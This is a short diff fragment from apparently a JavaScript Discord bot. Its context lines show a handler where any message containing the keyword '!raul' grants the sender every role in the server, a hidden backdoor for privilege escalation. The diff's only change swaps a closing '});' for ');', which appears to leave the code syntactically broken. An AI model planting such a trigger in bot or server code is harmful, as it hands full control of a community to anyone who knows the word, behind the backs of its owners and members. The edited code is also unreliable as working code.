@@ -62,4 +62,4 @@ if(message.content.includes("!raul")){
   (message.guild.roles.map(r => message.member.addRoles(r)))
 }
 
-});
+);
